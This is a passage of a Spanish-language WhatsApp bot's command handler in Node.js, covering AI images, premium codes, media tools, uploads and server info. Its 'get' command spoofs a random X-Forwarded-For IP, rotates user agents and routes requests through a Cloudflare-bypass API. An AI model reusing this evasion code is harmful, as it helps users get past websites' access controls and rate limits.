    conn.sendMessage(m.chat, { image: { url: imagen }, caption: `Nombre: ${nombre}\nPrecio: ${costo}\nNiveles: ${nivels}` }, { quoted: m })
    break
}
case 'aisuki': {
    const query = args.join(' ');

    if (!query) {
        return m.reply('Por favor, ingresa un texto para generar la imagen.');
    }

    try {
        const promptText = query;
        const captionPrompt = `actuaras como SukiBot, un bot de WhatsApp hecho desde 0 por EliasarYT y responderás como si creaste una imagen de: ${promptText}`;

        const imageResponse = await axios.get(
            `https://eliasar-yt-api.vercel.app/api/ai/text2img?prompt=${encodeURIComponent(promptText)}`,
            { responseType: 'arraybuffer' }
        );

        if (imageResponse.status === 200) {
            const imageBuffer = Buffer.from(imageResponse.data, 'binary');

            const captionResponse = await axios.get(
                `https://eliasar-yt-api.vercel.app/api/chatgpt?text=hola&prompt=${encodeURIComponent(captionPrompt)}`
            );

            const caption = captionResponse.data?.status
                ? captionResponse.data.response || 'Aquí está tu imagen.'
                : 'Aquí está tu imagen.';

            await conn.sendMessage(m.chat, {
                image: imageBuffer,
                caption: caption,
            }, { quoted: m });

        } else {
            await m.reply('No se pudo generar la imagen en este momento. Intenta de nuevo más tarde.');
        }
    } catch (err) {
        console.log('Error al procesar la solicitud:', err.message);
        await m.reply('Hubo un error al procesar tu solicitud. Intenta de nuevo más tarde.');
    }
    break;
}
case 'newcode': {
if (!isOwner) 
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el owner puede generar códigos. Contacto para pagar: +1 (647) 558-4916`);

let tiempo = 0;
let match = text.match(/--time\s+(\d+)/);

let planes = {
"--prem1": 10,  
"--prem2": 20,  
"--prem3": 35,  
"--prem4": 70,  
"--prem5": 105  
};

for (let plan in planes) {
if (text.includes(plan)) {
tiempo = planes[plan];  
break;
}
}

if (match) tiempo = parseInt(match[1]);

let codigo = "MicaShade" + Math.floor(Math.random() * 10000);

premiumCodes[codigo] = { 
user: null,
exp: tiempo ? Date.now() + tiempo * 24 * 60 * 60 * 1000 : null
};

savePremium(premiumCodes);

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Código generado: ${codigo}\nVence en: ${tiempo ? tiempo + " días" : "Nunca"}`);
break;
}
case 'cangear': {
let cod = args[0];
if (!cod || !premiumCodes[cod]) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Código inválido o ya canjeado.`);

if (isPremium(userSender)) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ya eres usuario premium.`);

premiumCodes[cod].user = userSender;

savePremium(premiumCodes);

m.reply(`${SetEmoji[userSender] || SetEmoji.default} ¡Código canjeado con éxito! Ahora eres usuario premium.`);
break;
}

case 'listacodes': {
if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No autorizado.`);

let lista = Object.keys(premiumCodes);

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Códigos disponibles:\n${lista.length ? lista.join("\n") : "Ninguno"}`);
break;
}
case 'tomp3': {
const fs = require('fs');
const ffmpeg = require('fluent-ffmpeg');

if (!m.quoted) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Responde a un video con el comando tomp3 para convertirlo en audio.`);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Procesando el video, espera un momento...`);

try {
let video = await m.quoted.download();
let videoPath = `./tmp/input-${Date.now()}.mp4`;
let output = `./tmp/${Date.now()}.mp3`;

fs.writeFileSync(videoPath, video);

ffmpeg(videoPath)
.output(output)
.audioCodec('libmp3lame')
.format('mp3')
.on('error', (err) => {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error al convertir el video en audio.`);
})
.on('end', async () => {
await conn.sendMessage(m.chat, { audio: fs.readFileSync(output), mimetype: 'audio/mpeg' }, { quoted: m });
fs.unlinkSync(output);
fs.unlinkSync(videoPath);
})
.run();
} catch (error) {
console.error(error);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo descargar el video.`);
}
break;
}
case 'rmcode':
case 'eliminarcode': {
if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No autorizado.`);

let codEliminar = args[0];
if (!codEliminar || !premiumCodes[codEliminar]) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Código no encontrado.`);

delete premiumCodes[codEliminar];

savePremium(premiumCodes);

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Código eliminado: ${codEliminar}`);
break;
}

case 'listaprem': {
if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No autorizado.`);

let premiumData = loadPremium();
let lista = Object.entries(premiumData)
.filter(([_, data]) => data.user)
.map(([codigo, data]) => {
let diasRestantes = data.exp ? Math.ceil((data.exp - Date.now()) / (24 * 60 * 60 * 1000)) : "Nunca";
return `
Número: ${data.user.split("@")[0]}
Código: ${codigo}
Vence en: ${diasRestantes} días`;
});

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Lista de usuarios premium:\n\n${lista.length ? lista.join("\n\n") : "No hay usuarios premium."}`);
break;
}

case 'setemoji': {
if (!isPremium(userSender)) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando es solo para usuarios premium.`);
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un emoji.`);

SetEmoji[userSender] = text;
fs.writeFileSync(filePath, JSON.stringify(SetEmoji, null, 2));

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Emoji asignado: ${text}`);
break;
}
case 'setmenu': {
  if (!isPremium(userSender)) 
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando es solo para usuarios premium.`);

  if (!isMedia && !isQuotedImage) 
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Por favor, responde o envía una imagen para configurarla como foto de menú.`);

  const axios = require('axios');
  const FormData = require('form-data');
  const media = await quoted.download();
  const tempFilePath = `./tmp/${Math.random().toString(36).substring(7)}.jpg`;

  fs.writeFileSync(tempFilePath, media);

  try {
    const form = new FormData();
    form.append('file', fs.createReadStream(tempFilePath));
    form.append('expiry', 'infinit');

    const response = await axios.post('https://cdn.russellxz.click/upload.php', form, {
      headers: form.getHeaders()
    });

    fs.unlinkSync(tempFilePath);

    if (!response.data || !response.data.url) {
      return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al subir la imagen a Russell.`);
    }

    const url = response.data.url;
    FotosMenu[userSender] = url;
    fs.writeFileSync(fileFotoPath, JSON.stringify(FotosMenu, null, 2));

    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Foto de menú actualizada con éxito.`);
  } catch (error) {
    fs.unlinkSync(tempFilePath);
    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al subir la imagen: ${error.message || 'Intenta nuevamente.'}`);
  }

  break;
}
case 'sw': case 'robarestado': case 'robastatus': case 'RobaStatus': case 'dldownload': case 'swstatus': case 'swdescargar': case 'historia': {
if ("status@broadcast" != m.quoted?.chat) return m.reply(`*${SetEmoji[userSender] || SetEmoji.default} Por favor, responde a un estado de WhatsApp para descargar su contenido*`) 
try {
let buffer = await m.quoted?.download()
await conn.sendFile(m.chat, buffer, "", m.quoted?.text || "", null, false, { quoted: m })
} catch (e) {
console.log(e)
await m.reply(m.quoted?.text)
}}
break
case 'git':  
case 'gitclone':  
case 'gitc': {  
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el enlace de un repositorio de GitHub.`)  

let cleanedText = text.replace(/^https?:\/\//, '').replace(/\.git$/, '');

let repoUrlMatch = cleanedText.match(/github\.com\/([^\/]+)\/([^\/]+)/);  
if (!repoUrlMatch) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El enlace proporcionado no es válido.`);  

let owner = repoUrlMatch[1];  
let repo = repoUrlMatch[2];  

let branch = 'main'; 
let apiUrl = `https://api.github.com/repos/${owner}/${repo}/branches/${branch}`;

try {  
let response = await fetch(apiUrl);
if (!response.ok) {
branch = 'master';
apiUrl = `https://api.github.com/repos/${owner}/${repo}/branches/${branch}`;
response = await fetch(apiUrl);
if (!response.ok) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontró la rama principal del repositorio.`);  
}
}

let zipUrl = `https://github.com/${owner}/${repo}/archive/refs/heads/${branch}.zip`;

await conn.sendMessage(m.chat, {  
document: { url: zipUrl },  
mimetype: 'application/zip',  
fileName: `${repo}.zip`,  
caption: `Aquí tienes el repositorio en formato ZIP.`  
}, { quoted: m });  

} catch (err) {  
console.error(err);  
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ocurrió un error al procesar el comando. Error: ${err.message || 'Desconocido'}`);  
}  
break  
}
case 'get2': {
if (args.length < 2) {
return m.reply(`> 𖦼 *Uso incorrecto*\n> *Ejemplo:* _get2 --html https://example.com_`);
}

let tipo = args[0].toLowerCase();
let url = args[1];

if (!url.startsWith('http')) {
return m.reply(`> 𖦼 *URL incorrecta*\n> _Asegúrate de incluir_ *http://* o *https://*`);
}

try {
let headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
'Accept-Language': 'es-ES,es;q=0.9',
'Referer': url
};

let res = await axios.get(url, { headers });
let $ = cheerio.load(res.data);
let contenido = '';

switch (tipo) {
case '--html':
contenido = $.html();
break;
case '--js':
contenido = $('script').map((i, el) => $(el).html()).get().join('\n');
break;
case '--css':
contenido = $('style').map((i, el) => $(el).html()).get().join('\n');
break;
default:
return m.reply(`> 𖦼 *Tipo no válido*\n> _Usa:_ *--html*, *--js* o *--css*`);
}

let fileName = `codigo_${tipo.replace('--', '')}.txt`;
fs.writeFileSync(fileName, contenido);

await conn.sendMessage(m.chat, {
document: fs.readFileSync(fileName),
fileName: fileName,
mimetype: 'text/plain'
}, { quoted: m });

fs.unlinkSync(fileName);

m.reply(`> ✅ *Código extraído con éxito*\n> _Archivo enviado:_ *${fileName}*`);

} catch (error) {
console.error(error);
m.reply(`> 𖦼 *Error al obtener la página*\n> _Puede estar protegida o no ser accesible_`);
}
break;            
} 
case 'get': {
if (!isOwner) return;
if (!text) return m.reply("⚠️ Ingresa una URL válida.");

const axios = require('axios');
const { URL } = require('url');

const ip = () => `${Math.random() * 255 | 0}.${Math.random() * 255 | 0}.${Math.random() * 255 | 0}.${Math.random() * 255 | 0}`;
const ua = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
];

let args = text.split(" ");
let url = args[0];
let isPro = args.includes("--pro");
let isPost = args.includes("--post");
let postData = {};

if (isPost) {
let postIndex = args.indexOf("--post");
try {
postData = JSON.parse(args.slice(postIndex + 1).join(" "));
} catch (e) {
return m.reply("⚠️ Error en los parámetros JSON de la solicitud POST.");
}
}

let requestUrl = isPro ? `https://fgsi1-restapi.hf.space/api/tools/bypasscf?url=${encodeURIComponent(url)}` : url;
let method = isPost ? "POST" : "GET";

let headers = {
"User-Agent": ua[Math.random() * ua.length | 0],
"X-Forwarded-For": ip(),
"Referer": url,
"Accept-Language": "es-ES,es;q=0.9"
};

axios({
method,
url: requestUrl,
headers: headers,
responseType: "arraybuffer",
data: isPost ? postData : undefined
}).then(async r => {
let ct = r.headers["content-type"];
let opt = { quoted: m };

if (isPro) {
try {
let apiResponse = JSON.parse(r.data.toString());
if (apiResponse.status && apiResponse.data.success) {
return conn.sendMessage(m.chat, { text: apiResponse.data.data.markdown }, opt);
} else {
return conn.sendMessage(m.chat, { text: "⚠️ Error al obtener los datos desde la API." }, opt);
}
} catch (e) {
return conn.sendMessage(m.chat, { text: "⚠️ Error procesando la respuesta de la API." }, opt);
}
}
if (/text\/html/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/image\/(jpeg|png|gif|bmp|webp)/.test(ct) || /image\/svg\+xml/.test(ct)) return conn.sendMessage(m.chat, { image: r.data }, opt);
if (/image\/heic/.test(ct)) return conn.sendMessage(m.chat, { image: r.data }, opt);
if (/video\/(mp4|webm|ogg|mkv)/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/3gpp/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/3gpp2/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/quicktime/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/x-msvideo/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/x-flv/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/video\/x-ms-wmv/.test(ct)) return conn.sendMessage(m.chat, { video: r.data }, opt);
if (/audio\/(mpeg|ogg|wav|flac|aac|opus)/.test(ct)) return conn.sendMessage(m.chat, { audio: r.data, mimetype: ct }, opt);
if (/audio\/3gpp/.test(ct)) return conn.sendMessage(m.chat, { audio: r.data, mimetype: ct }, opt);
if (/audio\/midi/.test(ct)) return conn.sendMessage(m.chat, { audio: r.data, mimetype: ct }, opt);
if (/application\/pdf/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.pdf" }, opt);
if (/application\/zip/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.zip" }, opt);
if (/application\/x-tar/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.tar" }, opt);
if (/application\/x-gzip/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.gz" }, opt);
if (/application\/x-iso9660-image/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.iso" }, opt);
if (/application\/x-msdownload/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.exe" }, opt);
if (/application\/x-java-archive/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.jar" }, opt);
if (/application\/x-ms-installer/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.msi" }, opt);
if (/application\/x-cpio/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.cpio" }, opt);
if (/application\/x-rpm/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.rpm" }, opt);
if (/application\/x-apple-diskimage/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.dmg" }, opt);
if (/application\/vnd\.apple\.installer\+xml/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.pkg" }, opt);
if (/application\/json/.test(ct)) return conn.sendMessage(m.chat, { text: JSON.stringify(JSON.parse(r.data.toString()), null, 2) }, opt);
if (/text\/plain/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/text\/csv/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.csv" }, opt);
if (/text\/markdown/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/text\/css/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/text\/xml/.test(ct) || /application\/xml/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/xhtml\+xml/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/xml-dtd/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/ld\+json/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/msword/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.doc" }, opt);
if (/application\/vnd\.openxmlformats-officedocument\.wordprocessingml\.document/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.docx" }, opt);
if (/application\/vnd\.ms-excel/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.xls" }, opt);
if (/application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.xlsx" }, opt);
if (/application\/vnd\.ms-powerpoint/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.ppt" }, opt);
if (/application\/vnd\.openxmlformats-officedocument\.presentationml\.presentation/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.pptx" }, opt);
if (/application\/vnd\.oasis\.opendocument\.text/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.odt" }, opt);
if (/application\/vnd\.oasis\.opendocument\.spreadsheet/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.ods" }, opt);
if (/application\/vnd\.oasis\.opendocument\.presentation/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.odp" }, opt);
if (/application\/x-shockwave-flash/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.swf" }, opt);
if (/application\/x-rar-compressed/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.rar" }, opt);
if (/application\/x-7z-compressed/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.7z" }, opt);
if (/application\/epub\+zip/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.epub" }, opt);
if (/application\/octet-stream/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.bin" }, opt);
if (/application\/x-httpd-php/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/x-sh/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/rtf/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.rtf" }, opt);
if (/application\/x-mpegurl/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/vnd\.apple\.mpegurl/.test(ct)) return conn.sendMessage(m.chat, { text: r.data.toString() }, opt);
if (/application\/x-bzip/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.bz" }, opt);
if (/application\/x-bzip2/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo.bz2" }, opt);
if (/font\/(woff2?|ttf|otf)/.test(ct)) return conn.sendMessage(m.chat, { document: r.data, mimetype: ct, fileName: "archivo." + ct.split('/')[1] }, opt);
return conn.sendMessage(m.chat, { text: "Contenido no soportado." }, opt);
}).catch(err => {
  conn.sendMessage(m.chat, { text: `⚠️ Error en la solicitud: ${err.message}` }, { quoted: m });
});
break;
}
case 'hd': {
const FormData = require("form-data");
const Jimp = require("jimp");

let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || q.mediaType || "";

if (!mime) return m.reply(`Responde a una imagen con *${prefix + command}*`);
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Formato de imagen no soportado. Usa JPG o PNG.`);

m.reply(`Procesando imagen, espera un momento...`);

try {
let img = await q.download?.();
if (!img) return m.reply("Error al descargar la imagen.");

let image = await Jimp.read(img);
image
.resize(Jimp.AUTO, 1080)
.quality(95)
.brightness(0.4)
.contrast(0.10)
.normalize();

let buffer = await image.getBufferAsync(Jimp.MIME_JPEG);
conn.sendMessage(m.chat, {
image: buffer,
caption: `HD-${id}`
}, {
quoted: m,
ephemeralExpiration: 24 * 60 * 60 * 1000,
disappearingMessagesInChat: 24 * 60 * 60 * 1000
});

} catch (e) {
console.error(e);
return m.reply("Ocurrió un error al mejorar la imagen.");
}
break;
}
case 'toghibli': {
    const args = text.trim().split(/\s+/);
    const size = args.find(arg => ["1:1", "3:2", "2:3"].includes(arg)) || "1:1";

    if (!isMedia && !isQuotedImage) {
        return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Enviá o respondé una imagen para convertirla al estilo Studio Ghibli.`);
    }

    await m.react('🕐');
    await m.reply(`${SetEmoji[userSender] || SetEmoji.default} Procesando tu imagen...\n\nEsto puede tardar uno o dos minutos, por favor espere.`);

    const media = await quoted.download();
    if (!(media instanceof Buffer)) {
        return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error: no se pudo obtener la imagen.`);
    }

    const extension = quoted.mimetype.split('/')[1];
    const tempFilePath = `./tmp/${Math.random().toString(36).substring(7)}.${extension}`;
    fs.writeFileSync(tempFilePath, media);

    try {
        const { ghibliGenerator } = require('./scrapers/ghibli.js');
        const result = await ghibliGenerator.generate(tempFilePath, { size });
        fs.unlinkSync(tempFilePath);

        if (!result.status) {
            return m.reply(
`${SetEmoji[userSender] || SetEmoji.default} ✦ Error al generar la imagen:\n
Mensaje: ${result.result?.error || 'desconocido'}\n
Detalles: ${JSON.stringify(result.result?.details || {}, null, 2)}\n
Stack trace (debug): ${result.result?.stack || 'no disponible'}`
            );
        }

        await conn.sendFile(m.chat, result.result.url, 'ghibli.jpg', null, m);
    } catch (error) {
        fs.unlinkSync(tempFilePath);
        console.error(error);
        return m.reply(`${SetEmoji[userSender] || SetEmoji.default} ✦ Error inesperado:\n\n${error.stack}`);
    }

    break;
}

case 'tourl': { const args = text.trim().split(/\s+/); let isIbb = args.includes("--ibb"); let isQuax = args.includes("--qu.ax"); let isRussell = args.includes("--russell"); let expiryIndex = args.findIndex(arg => !isNaN(arg)); let expiry = expiryIndex !== -1 ? args[expiryIndex] : "infinit";

if (!isIbb && !isQuax && !isRussell) {
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Debes especificar un parámetro válido: --ibb, --qu.ax o --russell`);
}

if (isIbb && (!isMedia && !isQuotedImage)) {
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo puedes subir imágenes con --ibb.`);
}

if (!isMedia && !isQuotedImage && !isQuotedAudio && !isQuotedVideo && !isQuotedSticker) {
    return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Por favor, responde o envía un archivo (imagen, audio, video o sticker) para convertirlo a URL.`);
}

const media = await quoted.download();
const extension = quoted.mimetype.split('/')[1];
const tempFilePath = `./tmp/${Math.random().toString(36).substring(7)}.${extension}`;

fs.writeFileSync(tempFilePath, media);

try {
    let url;
    const { uploadImage, quAx } = require('./scrapers/scraper.js');
    const axios = require('axios');
    const FormData = require('form-data');

    if (isIbb) {
        url = await uploadImage(tempFilePath);
    } else if (isQuax) {
        const response = await quAx(tempFilePath);
        if (!response.status) throw new Error(response.message);
        url = response.result.url;
    } else if (isRussell) {
        const form = new FormData();
        form.append('file', fs.createReadStream(tempFilePath));
        form.append('expiry', expiry);

        const response = await axios.post('https://cdn.russellxz.click/upload.php', form, {
            headers: form.getHeaders()
        });

        if (!response.data || !response.data.url) throw new Error('Error al subir a Russell.');
        url = response.data.url;
    }

    fs.unlinkSync(tempFilePath);
    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Archivo subido con éxito: ${url}`);
} catch (error) {
    fs.unlinkSync(tempFilePath);
    m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al subir el archivo: ${error.message || 'Intenta nuevamente.'}`);
}
break;
}
case 'setbotname': {
if (!isPremium(userSender)) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando es solo para usuarios premium.`);
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un nuevo nombre para el bot.`);

setBotName(userSender, text);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Tu bot ahora se llama: *${text}*`);
break;
}
case 'textoaudio': {
const gtts = require('google-tts-api');
let texto = m.quoted ? m.quoted.text : text;

if (!texto) return m.reply('Ingresa un texto o responde a un mensaje.');
if (texto.length > 200) return m.reply('El texto no debe superar los 200 caracteres.');

try {
let url = gtts.getAudioUrl(texto, { lang: 'es', slow: false });
await conn.sendMessage(m.chat, { audio: { url }, mimetype: 'audio/mpeg' }, { quoted: m });
} catch (err) {
m.reply('Hubo un error al generar el audio.');
}
break;
}
case 'ds': {
if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el propietario puede usar este comando.`);
const pathToDirectory = './sessions';
const fs = require('fs');
const path = require('path');

fs.readdir(pathToDirectory, (err, files) => {
if (err) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error leyendo la carpeta: ${err.message}`);

files.forEach(file => {
if (file !== 'creds.json') {
const filePath = path.join(pathToDirectory, file);
fs.unlink(filePath, err => {
if (err) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error eliminando archivo ${file}: ${err.message}`);
}
});
}
});

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Archivos eliminados, excepto el importante creds.json.`);
setTimeout(() => {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} ¿Hola? ¿Puedes verme?`);
}, 1000);
});
break;
}
case 'infobot': {
const os = require('os');
const moment = require('moment-timezone');

let modo = global.publicMode ? 'Público' : 'Privado';
let grupos = Object.keys(global.db?.data?.chats || {}).filter(jid => jid.endsWith('@g.us')).length;
let bloqueados = (conn.blocklist && Array.isArray(conn.blocklist)) ? conn.blocklist.length : 0;
let usuariosRegistrados = Object.keys(global.db?.data?.users || {}).length;
let uptime = process.uptime();
let tiempoActivo = moment.duration(uptime, 'seconds').humanize();
let memoriaUso = process.memoryUsage();
let totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
let libreRam = (os.freemem() / 1024 / 1024).toFixed(2);
let cpuModelo = os.cpus()[0].model;
let cpuVelocidad = os.cpus()[0].speed;
let sistemaOperativo = os.platform() + ' ' + os.release();
let totalComandos = Object.keys(global.cmdjs || {}).length;
let comandoMasUsado = global.cmdmasuse || 'Desconocido';
let comandosEjecutados = global.cmduse || 0;
let region = moment.tz.guess();

let mensajeInfo = 
`╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Check BOT\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

*◦ MODO* : ${modo}
*◦ GRUPOS UNIDOS* : ${grupos}
*◦ CONTACTOS BLOQUEADOS* : ${bloqueados}
*◦ USUARIOS REGISTRADOS* : ${usuariosRegistrados}
*◦ UPTIME* : ${tiempoActivo}
*◦ RAM* : Usada ${(memoriaUso.rss / 1024 / 1024).toFixed(2)}MB / ${totalRam}MB | Libre: ${libreRam}MB
*◦ CPU* : ${cpuModelo} - ${cpuVelocidad}MHz
*◦ SISTEMA OPERATIVO* : ${sistemaOperativo}
*◦ REGIÓN DEL BOT* : ${region}
*◦ COMANDOS DISPONIBLES* : ${totalComandos}
*◦ COMANDO MÁS USADO* : ${comandoMasUsado}
*◦ COMANDOS EJECUTADOS* : ${comandosEjecutados}`;

conn.sendMessage(m.chat, {
text: mensajeInfo,
contextInfo: {
mentionedJid: [],
forwardingScore: 0,
isForwarded: false,
remoteJid: null,
externalAdReply: {
title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`,
body: null,
mediaType: 1,
previewType: 0,
showAdAttribution: false,
renderLargerThumbnail: true,
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default,
}
}
}, { quoted: m });
}
break;
case 'check': 
case 'ping': 
case 'run': 
case 'runtime': {
const os = require('os');
const si = require('systeminformation');
const moment = require('moment-timezone');
const fetch = require('node-fetch');
const process = require('process');

async function getServerInfo() {
try {
const osInfo = await si.osInfo();
const mem = await si.mem();
const cpu = await si.cpu();
const disks = await si.fsSize();
const uptime = moment.duration(os.uptime(), 'seconds').humanize();
const cpuLoad = await si.currentLoad();
let locationData = await fetch('http://ip-api.com/json');
let location = await locationData.json();
let cpuUsage = cpuLoad.cpus.map((core, i) => ` *◦ Core ${i + 1}* : ${core.load.toFixed(2)}%`).join('\n');

let message = `
╭  ${SetEmoji[userSender] || SetEmoji.default} \`\`\`Check Server\`\`\` ${SetEmoji[userSender] || SetEmoji.default}  ╮

*◦ OS* : ${osInfo.distro} ${osInfo.release}
*◦ RAM* : ${(mem.used / 1073741824).toFixed(2)} GB / ${(mem.total / 1073741824).toFixed(2)} GB
*◦ CPU* : ${cpu.manufacturer} ${cpu.brand} ${cpu.speed}GHz
*◦ Cores* : ${cpu.cores}
*◦ Storage* : ${(disks.reduce((a, b) => a + b.size, 0) / 1073741824).toFixed(2)} GB
*◦ Current Path* : ${process.cwd()}
*◦ Country* : ${location.country}
*◦ Country Code* : ${location.countryCode}
*◦ Region* : ${location.region}
*◦ Region Name* : ${location.regionName}
*◦ City* : ${location.city}
*◦ Latitude* : ${location.lat}
*◦ Longitude* : ${location.lon}
*◦ Timezone* : ${location.timezone}
*◦ Uptime* : ${uptime}

${cpuUsage}
`;

conn.sendMessage(m.chat, {
text: message,
linkPreview: true,
contextInfo: {
mentionedJid: [],
forwardingScore: 0,
isForwarded: false,
remoteJid: null,
externalAdReply: {
title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`,
body: null,
mediaType: 1,
previewType: 0,
showAdAttribution: false,
renderLargerThumbnail: true,
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default,
}
}
}, { quoted: m });

} catch (error) {
console.error(error);
conn.sendMessage(m.chat, { text: 'Error retrieving system information.' }, { quoted: m });
}
}

getServerInfo();
break;
}
case 'infomsg': {
